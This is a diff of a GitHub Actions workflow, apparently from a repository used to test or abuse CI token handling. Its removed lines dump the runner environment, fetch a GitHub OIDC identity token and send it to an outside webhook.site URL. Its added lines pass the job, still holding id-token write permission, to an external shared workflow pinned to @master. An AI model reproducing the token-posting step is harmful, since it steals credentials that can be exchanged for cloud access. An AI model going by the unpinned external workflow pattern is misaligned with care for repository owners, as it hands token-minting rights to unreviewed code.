@@ -7,22 +7,10 @@ on:
 
 jobs:
   auth:
-
-    # Add "id-token" with the intended permissions.
     permissions:
       contents: 'read'
       id-token: 'write'
 
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@master
-        with:
-          fetch-depth: 1
-      - name: Dump env
-        run: env
-      - name: Post the token
-        run: |
-          OIDC_TOKEN=$(curl -sLS "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=o6s" -H "User-Agent: actions/oidc-client" -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN")
-
-          curl -i -s --data-binary "$OIDC_TOKEN" \
-            https://webhook.site/7104640f-d160-47aa-91eb-e8dc14dd5547
+    uses: menulpatrol/workflows/.github/workflows/shared.yaml@master
+    with:
+      echo: Bla
